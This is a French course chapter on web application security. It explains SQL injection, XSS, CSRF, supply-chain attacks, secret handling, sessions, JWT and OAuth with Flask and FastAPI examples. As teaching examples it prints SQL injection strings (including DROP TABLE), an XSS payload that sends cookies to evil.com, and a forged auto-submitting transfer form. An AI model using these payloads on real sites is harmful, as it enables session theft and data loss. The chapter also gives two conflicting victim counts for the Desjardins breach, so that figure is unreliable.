---
title: "La sécurité"
weight: 50
slug: "securite"
---

# La sécurité

La sécurité informatique est souvent traitée comme une préoccupation secondaire
dans le développement logiciel. On construit d'abord les fonctionnalités, on
déploie, et on se dit qu'on "ajoutera la sécurité plus tard". Cette approche a
un nom : le modèle du "château fort", où la sécurité est une muraille qu'on
érige autour d'un système déjà construit. Le problème, c'est que les attaquants
ne se présentent pas toujours à la porte d'entrée : ils exploitent les failles
dans les fondations, ou ils sont déjà à l'intérieur. En septembre 2017, Equifax,
l'une des trois grandes agences d'évaluation du crédit aux États-Unis, a révélé
que les données personnelles de 147 millions de personnes avaient été volées :
noms, numéros de sécurité sociale, dates de naissance, adresses. La cause ? Une
vulnérabilité connue dans Apache Struts, un framework web Java, pour laquelle un
correctif existait depuis mars 2017. Equifax ne l'avait tout simplement pas
appliqué. La vulnérabilité en question permettait l'exécution de code arbitraire
à distance, et elle figurait dans le OWASP Top 10, le classement de référence
des vulnérabilités web les plus courantes. En juin 2019, c'est au Québec que
l'une des plus grandes fuites de données au Canada a été révélée : un employé du
Mouvement Desjardins avait exfiltré les données personnelles de 9,7 millions de
membres, soit la quasi-totalité de la clientèle. Noms, adresses, dates de
naissance, numéros d'assurance sociale, habitudes transactionnelles.
Contrairement à Equifax, il ne s'agissait pas d'une faille technique exploitée
de l'extérieur, mais d'une menace interne : un utilisateur légitime qui avait
accès à des données qu'il n'aurait probablement pas dû pouvoir extraire en
masse. L'incident a mis en lumière l'importance du principe du moindre privilège
et de la surveillance des accès internes, des aspects de la sécurité qui ne se
règlent pas avec un pare-feu.

Ces deux incidents illustrent une leçon que l'industrie a mis du temps à
intégrer : la sécurité ne peut pas être une couche ajoutée après coup. C'est
l'idée du *shift left* en sécurité, une expression empruntée au mouvement
DevOps : au lieu de vérifier la sécurité à la fin du cycle de développement (à
droite sur la ligne du temps), on la déplace vers le début (à gauche), en
l'intégrant dès la conception et le codage. Cette philosophie a donné naissance
au terme **DevSecOps**, qui insère la sécurité au coeur du pipeline de livraison
continue. Concrètement, cela signifie que les vulnérabilités doivent être
détectées et corrigées aussi tôt que possible : dans l'éditeur du développeur,
dans les tests, dans le pipeline CI, plutôt qu'en production quand il est déjà
trop tard. Pour structurer cette vigilance, l'industrie s'appuie sur un cadre de
référence maintenu par l'OWASP (*Open Web Application Security Project*), une
fondation à but non lucratif créée en 2001. Son produit le plus connu est le
**OWASP Top 10**, un classement régulièrement mis à jour des dix catégories de
vulnérabilités web les plus critiques. L'édition 2021 (la plus récente au moment
d'écrire ces lignes) inclut notamment les injections (SQL, commandes), le
cross-site scripting (XSS), les problèmes d'authentification, les mauvaises
configurations de sécurité, et les composants avec des vulnérabilités connues
(exactement le problème d'Equifax). Plutôt que de tenter un survol exhaustif de
ces dix catégories, nous allons examiner en profondeur quelques-unes des
vulnérabilités les plus courantes et les plus instructives.

## Injection SQL

L'injection SQL est probablement la vulnérabilité la plus connue et la plus
enseignée en sécurité informatique. Elle consiste à insérer du code SQL
malicieux dans un champ de saisie utilisateur, de manière à manipuler la requête
que l'application envoie à sa base de données. Le principe est d'une simplicité
déconcertante. Imaginons une application Flask qui permet de chercher un
utilisateur par nom :

```python
@app.route("/user")
def get_user():
    name = request.args.get("name")
    query = f"SELECT * FROM users WHERE name = '{name}'"
    result = db.execute(query)
    return jsonify(result.fetchall())
```

Si un utilisateur normal envoie `?name=Alice`, la requête devient
`SELECT * FROM users WHERE name = 'Alice'`, ce qui fonctionne comme prévu. Mais
si un attaquant envoie `?name=' OR '1'='1`, la requête devient
`SELECT * FROM users WHERE name = '' OR '1'='1'`, ce qui retourne **tous** les
utilisateurs de la table, puisque la condition `'1'='1'` est toujours vraie.
Pire encore, un attaquant pourrait envoyer `?name='; DROP TABLE users; --` pour
tenter de supprimer la table entière. Le commentaire SQL `--` à la fin
neutralise le reste de la requête originale.

La correction est simple et connue depuis des décennies : les **requêtes
paramétrées** (aussi appelées *prepared statements*). Au lieu de construire la
requête par concaténation de chaînes, on utilise des paramètres que le moteur
SQL traite comme des données, jamais comme du code :

```python
@app.route("/user")
def get_user():
    name = request.args.get("name")
    query = "SELECT * FROM users WHERE name = :name"
    result = db.execute(query, {"name": name})
    return jsonify(result.fetchall())
```

Avec cette approche, même si l'attaquant envoie `' OR '1'='1`, le moteur SQL
cherchera littéralement un utilisateur dont le nom est la chaîne
`' OR '1'='1'`, et ne trouvera rien. La requête paramétrée garantit que l'entrée
utilisateur ne peut jamais être interprétée comme du code SQL. Les ORMs comme
SQLAlchemy (que nous avons rencontré dans le module 3) utilisent des requêtes
paramétrées par défaut, ce qui rend l'injection SQL beaucoup plus difficile à
introduire accidentellement. C'est un excellent exemple d'un principe récurrent
en sécurité : les bons outils et les bonnes abstractions protègent le
développeur de lui-même.

## Cross-Site Scripting (XSS)

Le cross-site scripting, ou XSS, est une vulnérabilité qui exploite la confiance
qu'un navigateur accorde au contenu d'un site web. Le principe : un attaquant
parvient à injecter du code JavaScript dans une page qui sera affichée à
d'autres utilisateurs. Le navigateur de la victime exécute ce code comme s'il
provenait du site légitime, ce qui donne à l'attaquant accès aux cookies de
session, aux données affichées, et potentiellement au compte de l'utilisateur.
Comme l'injection SQL, le XSS repose sur une confusion entre données et code,
mais cette fois-ci côté client plutôt que côté serveur. Imaginons une
application Flask qui affiche un message de bienvenue personnalisé :

```python
@app.route("/hello")
def hello():
    name = request.args.get("name", "")
    return f"<h1>Bonjour {name} !</h1>"
```

Si un utilisateur visite `/hello?name=Alice`, la page affiche « Bonjour
Alice ! ». Mais si un attaquant envoie
`/hello?name=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>`,
le navigateur exécute le JavaScript injecté et envoie les cookies de la victime
au serveur de l'attaquant. Ce type de XSS est dit « réfléchi » (*reflected*) :
le code malicieux fait un aller-retour via le serveur dans la réponse HTTP. Il
existe aussi le XSS « stocké » (*stored*), plus dangereux, où le code malicieux
est sauvegardé dans la base de données (par exemple dans un commentaire de
forum) et exécuté à chaque fois qu'un utilisateur consulte la page.

La défense contre le XSS repose sur un principe fondamental :
l'**échappement** (*escaping*) des données utilisateur avant de les insérer
dans le HTML. L'idée est de transformer les caractères spéciaux HTML (`<`, `>`,
`&`, `"`, `'`) en leurs entités correspondantes (`&lt;`, `&gt;`, etc.), de
sorte que le navigateur les affiche comme du texte plutôt que de les interpréter
comme du code. En Flask, la solution est d'utiliser le moteur de templates
Jinja2, qui échappe automatiquement toutes les variables :

```python
# templates/hello.html
# <h1>Bonjour {{ name }} !</h1>

@app.route("/hello")
def hello():
    name = request.args.get("name", "")
    return render_template("hello.html", name=name)
```

Avec cette approche, si l'attaquant injecte une balise `<script>`, elle sera
affichée littéralement comme du texte (`&lt;script&gt;`) au lieu d'être
exécutée. Comme pour l'injection SQL et les requêtes paramétrées, la meilleure
défense n'est pas la vigilance individuelle du développeur, mais un outil qui
applique la protection par défaut. C'est pourquoi les frameworks web modernes
(Flask/Jinja2, Django, React, Vue) échappent tous le HTML automatiquement. Les
vulnérabilités XSS apparaissent quand un développeur contourne délibérément cet
échappement, par exemple en utilisant `| safe` dans Jinja2 ou
`dangerouslySetInnerHTML` en React, des noms choisis pour que le danger soit
explicite.

## Cross-Site Request Forgery (CSRF)

Le CSRF (parfois prononcé « sea-surf ») exploite un mécanisme différent : la
confiance qu'un serveur accorde au navigateur de l'utilisateur. Quand un
utilisateur est connecté à un site (par exemple sa banque), son navigateur
envoie automatiquement les cookies de session avec chaque requête vers ce site.
Un attaquant peut exploiter ce comportement en piégeant l'utilisateur pour
qu'il envoie, à son insu, une requête vers le site cible. Imaginons une
application bancaire simplifiée :

```python
@app.route("/transfer", methods=["POST"])
def transfer():
    to = request.form["to"]
    amount = request.form["amount"]
    # Le cookie de session authentifie automatiquement l'utilisateur
    execute_transfer(current_user, to, amount)
    return "Transfert effectué"
```

Un attaquant peut créer une page malicieuse contenant un formulaire invisible
qui se soumet automatiquement :

```html
<!-- Sur evil.com -->
<form action="https://banque.com/transfer" method="POST">
  <input type="hidden" name="to" value="attaquant" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit();</script>
```

Si la victime visite cette page pendant qu'elle est connectée à sa banque, le
navigateur envoie la requête de transfert avec ses cookies de session valides.
Du point de vue du serveur, la requête est parfaitement légitime. La défense
standard est le **jeton CSRF** (*CSRF token*). Le principe : le serveur génère
un jeton aléatoire unique pour chaque session et l'inclut comme champ caché
dans le HTML du formulaire. À la soumission, le serveur vérifie que le jeton
reçu correspond à celui qu'il a émis. Puisque l'attaquant ne peut pas lire les
pages du site cible (la *same-origin policy* du navigateur l'en empêche), il ne
peut pas deviner le jeton. En Flask, l'extension Flask-WTF intègre cette
protection. Côté serveur, on définit le formulaire et sa validation :

```python
from flask_wtf import FlaskForm
from wtforms import StringField, DecimalField

class TransferForm(FlaskForm):
    to = StringField("Destinataire")
    amount = DecimalField("Montant")

@app.route("/transfer", methods=["GET", "POST"])
def transfer():
    form = TransferForm()
    if form.validate_on_submit():  # Vérifie le jeton CSRF automatiquement
        execute_transfer(current_user, form.to.data, form.amount.data)
        return "Transfert effectué"
    return render_template("transfer.html", form=form)
```

Côté template, le jeton est inséré automatiquement comme champ caché :

```html
<!-- templates/transfer.html -->
<form method="POST" action="/transfer">
  {{ form.hidden_tag() }}  <!-- Génère : <input type="hidden" name="csrf_token" value="a3f8b2c1..." /> -->
  {{ form.to.label }} {{ form.to() }}
  {{ form.amount.label }} {{ form.amount() }}
  <button type="submit">Transférer</button>
</form>
```

L'appel `form.validate_on_submit()` vérifie non seulement les données du
formulaire, mais aussi que le jeton CSRF est présent et valide. Si la requête
provient du formulaire invisible sur `evil.com`, elle n'inclura pas ce jeton, et
le serveur la rejettera avec une erreur 400. Encore une fois, le même schéma se
répète : la protection est intégrée dans le framework, et le développeur en
bénéficie sans effort supplémentaire à condition d'utiliser les bons outils.

## Au-delà du code applicatif

Les trois vulnérabilités que nous venons d'examiner partagent un point commun :
elles sont introduites par le développeur dans son propre code, et elles se
corrigent par de meilleures pratiques de programmation. Mais un logiciel moderne
n'est pas fait que de code écrit en interne. Comme nous l'avons vu dans le
module 2 avec la gestion des dépendances, une application typique importe des
dizaines, voire des centaines de bibliothèques tierces. Chacune de ces
dépendances est un vecteur d'attaque potentiel. Et au-delà du code lui-même,
il y a l'infrastructure : comment les données circulent sur le réseau, comment
les secrets (mots de passe, clés API) sont stockés, comment les utilisateurs
s'authentifient. Les sections qui suivent abordent ces dimensions de la sécurité
qui dépassent le code applicatif.

## La chaîne d'approvisionnement logicielle

En décembre 2020, la firme de cybersécurité FireEye a découvert que SolarWinds,
un éditeur de logiciels de gestion d'infrastructure utilisé par des milliers
d'organisations dont le gouvernement américain, avait été compromis. Des
attaquants (attribués au renseignement russe) avaient réussi à insérer du code
malicieux directement dans le processus de build de SolarWinds, de sorte que
les mises à jour légitimes du produit Orion contenaient une backdoor. Environ
18 000 organisations ont installé cette mise à jour piégée. L'attaque était
remarquable non pas par sa complexité technique, mais par son vecteur : les
victimes n'avaient commis aucune erreur. Elles avaient simplement fait
confiance à leur fournisseur de logiciel et appliqué une mise à jour, exactement
comme les bonnes pratiques le recommandent. C'est le paradoxe de la sécurité de
la chaîne d'approvisionnement (*supply chain security*) : les mêmes mécanismes
de confiance qui permettent à l'écosystème logiciel de fonctionner sont aussi
ses points de vulnérabilité.

Un cas encore plus troublant a émergé en mars 2024 avec la découverte d'une
backdoor dans xz Utils, un utilitaire de compression présent sur pratiquement
toutes les distributions Linux. Un développeur utilisant le pseudonyme « Jia
Tan » avait contribué au projet pendant deux ans, gagnant progressivement la
confiance du mainteneur principal (qui était seul et épuisé), jusqu'à obtenir
les droits de commit. Il avait ensuite inséré, par étapes, un code malicieux
sophistiqué dans le processus de build, conçu pour compromettre les connexions
SSH sur les systèmes affectés. La backdoor a été découverte par hasard par un
ingénieur de Microsoft, Andres Freund, qui avait remarqué que ses connexions
SSH étaient anormalement lentes. Si elle n'avait pas été détectée, elle aurait
potentiellement donné un accès à distance à des millions de serveurs dans le
monde. L'incident illustre un problème structurel de l'écosystème open source,
que nous aborderons plus en détail dans le module 6 : des composants critiques
de l'infrastructure mondiale sont maintenus par des bénévoles isolés, souvent
sans ressources ni relève. L'attaquant n'a pas exploité une faille technique :
il a exploité l'épuisement d'un mainteneur solitaire.

Face à ces menaces, la première ligne de défense est la vigilance sur les
dépendances, un sujet que nous avons abordé dans le module 2. Des outils comme
`pip audit` (pour Python), `npm audit` (pour JavaScript) ou Dependabot (intégré
à GitHub) analysent automatiquement les dépendances d'un projet et signalent
celles qui contiennent des vulnérabilités connues, référencées dans des bases
de données publiques comme le CVE (*Common Vulnerabilities and Exposures*).
L'incident d'Equifax, rappelons-le, aurait été évité par un simple scan de
dépendances. Dans un pipeline CI/CD, ces vérifications peuvent être
automatisées : un build qui échoue parce qu'une dépendance a une vulnérabilité
critique connue est un mécanisme de protection directement en phase avec la
philosophie du shift left. Mais les outils de scanning ne protègent que contre
les vulnérabilités *connues*. L'attaque xz a montré que la menace peut venir de
l'intérieur même du processus de développement, ce qui rend d'autant plus
important le principe de la revue de code, les signatures cryptographiques des
releases, et la diversification des mainteneurs sur les projets critiques.

## HTTPS et le chiffrement en transit

Quand un navigateur communique avec un serveur web via HTTP, les données
circulent en clair sur le réseau. Tout intermédiaire (un routeur Wi-Fi
compromis, un fournisseur d'accès internet, un attaquant sur le même réseau)
peut lire le contenu des requêtes et des réponses : identifiants de connexion,
numéros de carte de crédit, messages personnels. HTTPS résout ce problème en
enveloppant HTTP dans une couche de chiffrement appelée TLS (*Transport Layer
Security*). Le principe est le suivant : avant d'échanger des données, le
navigateur et le serveur effectuent un « handshake » durant lequel le serveur
présente un certificat numérique qui prouve son identité, et les deux parties
négocient une clé de chiffrement partagée. Toutes les données échangées ensuite
sont chiffrées, rendant leur interception inutile pour un attaquant. Le
certificat est émis par une autorité de certification (*Certificate Authority*,
CA) qui vérifie que le demandeur contrôle bien le domaine en question.
Historiquement, obtenir un certificat TLS coûtait cher et nécessitait des
démarches administratives, ce qui freinait l'adoption de HTTPS. En 2015, le
projet Let's Encrypt, fondé par l'Internet Security Research Group (ISRG), a
changé la donne en offrant des certificats gratuits et automatisables.
Aujourd'hui, plus de 80 % du trafic web mondial utilise HTTPS, et les
navigateurs modernes affichent un avertissement explicite pour les sites qui ne
l'utilisent pas.

## La gestion des secrets

HTTPS protège les données en transit sur le réseau, mais il y a une autre
catégorie de données sensibles qui mérite une attention particulière : les
secrets de l'application elle-même. Mots de passe de bases de données, clés
API, jetons d'accès à des services tiers, clés de chiffrement : ce sont les
« clés du royaume », et leur mauvaise gestion est une source constante de
brèches de sécurité. Le scénario le plus courant est tristement banal : un
développeur, pour simplifier la configuration de son environnement local, écrit
un mot de passe directement dans le code source, puis oublie de le retirer
avant de pousser sur GitHub. En 2013, des chercheurs ont montré qu'en scannant
automatiquement les dépôts publics de GitHub, on pouvait trouver des milliers
de clés AWS, de mots de passe de bases de données et de jetons d'API exposés en
clair. Le problème est aggravé par la nature de git : même si le développeur
supprime le secret dans un commit subséquent, il reste dans l'historique,
accessible à quiconque sait chercher. Des outils comme TruffleHog ou GitLeaks
automatisent précisément cette recherche.

La première ligne de défense est simple : ne jamais stocker de secrets dans le
code source. La Twelve-Factor App (facteur III) recommande de passer toute
configuration qui varie entre les environnements par des **variables
d'environnement**. Au lieu d'écrire `DB_PASSWORD = "motdepasse123"` dans le
code, on lit `os.environ["DB_PASSWORD"]` et on définit la variable à
l'extérieur du code, dans l'environnement d'exécution. En développement local,
le pattern courant est d'utiliser un fichier `.env` (chargé par une
bibliothèque comme `python-dotenv`) et de s'assurer que ce fichier est listé
dans `.gitignore` pour qu'il ne soit jamais versionné :

```python
import os
from dotenv import load_dotenv

load_dotenv()  # Charge les variables depuis .env

db_password = os.environ["DB_PASSWORD"]
api_key = os.environ["API_KEY"]
```

```shell
# .env (listé dans .gitignore)
DB_PASSWORD=motdepasse123
API_KEY=sk-abc123def456
```

En production, les
secrets sont injectés par la plateforme de déploiement : Kubernetes Secrets,
les variables d'environnement de GitHub Actions, ou un service dédié comme
HashiCorp Vault. Cette dernière catégorie d'outils, les *secrets managers*,
offre des fonctionnalités avancées : rotation automatique des secrets, audit
des accès, chiffrement au repos. Le principe est toujours le même : les secrets
ne doivent exister qu'à l'endroit où ils sont utilisés, jamais dans le code,
jamais dans l'historique git, et idéalement nulle part en clair sur le disque.

## Authentification et autorisation

Authentification et autorisation sont deux concepts distincts que l'on confond
souvent. L'**authentification** répond à la question « qui es-tu ? » : c'est le
processus par lequel un système vérifie l'identité d'un utilisateur.
L'**autorisation** répond à « qu'as-tu le droit de faire ? » : une fois
l'identité établie, quelles ressources et actions sont permises. Un utilisateur
peut être authentifié (le système sait qui il est) mais pas autorisé à accéder
à une ressource donnée (il n'a pas les permissions nécessaires). Le mécanisme
d'authentification le plus ancien et le plus répandu sur le web est le couple
identifiant/mot de passe. L'utilisateur envoie ses identifiants au serveur, qui
les vérifie contre sa base de données. Mais cette vérification ne se fait
qu'une fois : le serveur doit ensuite se souvenir que l'utilisateur est
authentifié pour les requêtes suivantes. C'est le problème de la **gestion de
session**, et sa solution la plus classique repose sur les cookies.

Le mécanisme est le suivant. Quand l'utilisateur se connecte avec succès, le
serveur crée une **session** : un enregistrement côté serveur qui contient
l'identité de l'utilisateur et éventuellement d'autres informations (son rôle,
ses préférences, le moment de la connexion). Le serveur attribue à cette session
un identifiant unique, une longue chaîne aléatoire, et le renvoie au navigateur
sous la forme d'un cookie via l'en-tête HTTP `Set-Cookie`. À partir de ce
moment, le navigateur inclut automatiquement ce cookie dans chaque requête
subséquente vers le même domaine. Le serveur reçoit l'identifiant de session, le
retrouve dans sa mémoire (ou dans une base de données comme Redis), et sait
ainsi qui est l'utilisateur sans lui redemander ses identifiants. C'est
précisément ce mécanisme que le CSRF exploite, comme nous l'avons vu plus tôt :
le navigateur envoie le cookie de session *automatiquement*, même si la requête
a été initiée par un site tiers. En Flask, les sessions sont intégrées
directement dans le framework :

```python
from flask import Flask, session, request, redirect
import os

app = Flask(__name__)
app.secret_key = os.environ["SECRET_KEY"]  # Clé pour signer les cookies

@app.route("/login", methods=["POST"])
def login():
    user = authenticate(request.form["username"], request.form["password"])
    if user:
        session["user_id"] = user.id
        session["role"] = user.role
        return redirect("/dashboard")
    return "Identifiants invalides", 401

@app.route("/dashboard")
def dashboard():
    if "user_id" not in session:
        return redirect("/login")
    return f"Bienvenue, utilisateur {session['user_id']}"
```

L'objet `session` de Flask est un dictionnaire signé cryptographiquement : le
contenu est stocké dans le cookie lui-même (pas sur le serveur), mais il est
signé avec la `secret_key` de l'application, ce qui empêche un utilisateur de
modifier ses données de session. Si l'application a besoin de stocker des
sessions plus volumineuses ou de pouvoir les invalider côté serveur (par exemple
pour forcer la déconnexion d'un utilisateur compromis), on peut utiliser une
extension comme Flask-Session qui stocke les données dans Redis ou une base de
données.

L'approche par sessions a un inconvénient : le serveur doit maintenir un état
(la liste des sessions actives) pour chaque utilisateur connecté. Pour une
application web classique, c'est rarement un problème. Mais pour une API
consommée par des clients multiples (application mobile, frontend SPA, service
tiers), cette dépendance à l'état côté serveur devient une contrainte. Les
**JSON Web Tokens** (JWT, prononcé « jot ») proposent une alternative
*stateless* : au lieu de stocker l'identité de l'utilisateur sur le serveur, on
l'encode directement dans un jeton signé que le client transporte avec chaque
requête. Un JWT est composé de trois parties séparées par des points : un
*header* (l'algorithme de signature), un *payload* (les données, appelées
*claims*), et une *signature* calculée par le serveur avec une clé secrète.
Voici à quoi ressemble le payload décodé d'un JWT typique :

```json
{
  "sub": "alice",
  "role": "admin",
  "exp": 1717027200
}
```

Le champ `sub` (*subject*) identifie l'utilisateur, `role` est un claim
personnalisé, et `exp` est la date d'expiration du jeton (en secondes depuis le
1er janvier 1970, le format Unix). Un point important : le payload n'est pas
chiffré, il est simplement encodé en Base64. N'importe qui peut le lire. Ce qui
est protégé, c'est l'intégrité : la signature garantit que personne ne peut
modifier le contenu (par exemple changer `"role": "user"` en
`"role": "admin"`) sans invalider le jeton. Le serveur n'a besoin de rien
stocker : quand il reçoit un JWT, il vérifie la signature avec sa clé secrète,
décode le payload, et sait immédiatement qui est l'utilisateur. Le client envoie
le jeton dans l'en-tête HTTP `Authorization: Bearer <token>` à chaque requête.
Voici une implémentation simplifiée avec FastAPI (que nous avons déjà utilisé
dans le tutoriel sur l'observabilité) :

```python
from fastapi import FastAPI, Depends, HTTPException
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
import jwt
import os

app = FastAPI()
SECRET_KEY = os.environ["SECRET_KEY"]
security = HTTPBearer()

@app.post("/login")
def login(username: str, password: str):
    user = authenticate(username, password)
    if not user:
        raise HTTPException(status_code=401, detail="Identifiants invalides")
    token = jwt.encode(
        {"sub": user.username, "role": user.role, "exp": datetime.utcnow() + timedelta(hours=1)},
        SECRET_KEY, algorithm="HS256"
    )
    return {"access_token": token}

@app.get("/dashboard")
def dashboard(credentials: HTTPAuthorizationCredentials = Depends(security)):
    try:
        payload = jwt.decode(credentials.credentials, SECRET_KEY, algorithms=["HS256"])
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Jeton expiré")
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Jeton invalide")
    return {"message": f"Bienvenue, {payload['sub']}"}
```

Le contraste avec l'approche Flask par sessions est instructif. Avec les
sessions, le serveur stocke l'état et envoie un identifiant opaque au client.
Avec les JWT, le client porte toute l'information et le serveur est *stateless* :
il n'a rien à consulter, rien à stocker. Cette propriété rend les JWT
particulièrement adaptés aux architectures distribuées (microservices, APIs
publiques), où partager un état de session entre plusieurs serveurs serait
complexe. En contrepartie, les JWT ont un défaut majeur : on ne peut pas les
invalider individuellement. Si un utilisateur se fait voler son jeton, le
serveur n'a aucun moyen de le « révoquer » avant son expiration, puisqu'il n'en
garde aucune trace. C'est pourquoi les JWT ont typiquement une durée de vie
courte (15 minutes à une heure), complétée par un mécanisme de *refresh token*
pour renouveler l'accès sans redemander le mot de passe.

Les sessions et les JWT résolvent le problème de l'authentification directe :
l'utilisateur fournit ses identifiants à l'application, qui les vérifie. Mais il
existe un scénario de plus en plus courant où ce modèle ne fonctionne pas :
quand une application tierce a besoin d'accéder à vos données sur un autre
service *sans connaître votre mot de passe*. Imaginons qu'une application de
gestion de projets veuille accéder à vos dépôts GitHub pour afficher vos pull
requests. L'approche naïve serait de lui donner votre mot de passe GitHub, mais
c'est évidemment inacceptable : vous donneriez un accès total à votre compte à
une application en laquelle vous n'avez qu'une confiance limitée. Pour
comprendre la solution, imaginons une analogie. Vous arrivez à un hôtel et
demandez au voiturier de garer votre voiture. Vous lui remettez votre clé, mais
pas votre trousseau complet : vous lui donnez uniquement la clé de valet, celle
qui permet de démarrer le moteur mais pas d'ouvrir le coffre ni la boîte à
gants. Le voiturier peut accomplir sa tâche (déplacer la voiture) sans avoir
accès à vos affaires personnelles, et vous pouvez récupérer la clé à tout
moment. **OAuth 2.0** (2012) fonctionne sur le même principe : au lieu de
donner votre mot de passe (le trousseau complet) à une application tierce, vous
lui accordez un accès limité et révocable à vos données sur un autre service.
Concrètement, vous êtes redirigé vers le service d'origine (GitHub, Google,
etc.), vous vous authentifiez directement auprès de lui, et vous autorisez
explicitement l'application tierce à accéder à un périmètre limité de vos
données (les *scopes*). Le service d'origine émet alors un jeton d'accès
(*access token*) que l'application tierce utilise pour effectuer des requêtes en
votre nom. Vous n'avez jamais partagé votre mot de passe, et vous pouvez
révoquer l'accès à tout moment. Le bouton « Se connecter avec Google » ou « Se
connecter avec GitHub » que l'on voit partout sur le web est une application
d'OAuth 2.0 (plus précisément d'OpenID Connect, une couche d'authentification
construite par-dessus OAuth). C'est aussi le mécanisme qu'utilise
`gh auth login`, la commande d'authentification du CLI GitHub que nous avons vue
dans le module 4 : plutôt que de demander votre mot de passe, elle ouvre votre
navigateur pour que vous autorisiez le CLI via le flux OAuth de GitHub.

## Le principe du moindre privilège

Un fil conducteur traverse toutes les pratiques de sécurité que nous avons
abordées dans cette section : le **principe du moindre privilège** (*principle
of least privilege*). L'idée est simple : chaque composant d'un système, qu'il
s'agisse d'un utilisateur, d'un programme ou d'un service, ne devrait avoir
accès qu'aux ressources strictement nécessaires à l'accomplissement de sa tâche,
et pas une de plus. Les requêtes paramétrées empêchent une entrée utilisateur
d'accéder au pouvoir du langage SQL. L'échappement HTML empêche des données de
s'élever au rang de code exécutable. OAuth 2.0 accorde une clé de valet plutôt
que le trousseau complet. Les scopes d'un jeton d'accès limitent le périmètre
d'action d'une application tierce. Les variables d'environnement gardent les
secrets hors du code source. Chaque fois, le même réflexe : restreindre l'accès
au minimum nécessaire, parce que tout privilège superflu est une surface
d'attaque.

Ce principe éclaire aussi rétrospectivement la brèche de Desjardins de 2019,
que nous avons mentionnée en introduction. Un employé a pu exfiltrer les données
personnelles de 4,2 millions de membres, non pas en exploitant une
vulnérabilité technique sophistiquée, mais simplement parce qu'il avait accès à
bien plus de données que ce que son rôle nécessitait. Si le principe du moindre
privilège avait été appliqué rigoureusement, avec un contrôle d'accès
granulaire limitant chaque employé aux seules données pertinentes à ses
fonctions, l'ampleur de la brèche aurait été considérablement réduite. C'est
une leçon qui vaut autant pour les permissions des utilisateurs humains que pour
celles des services et des API dans une architecture logicielle.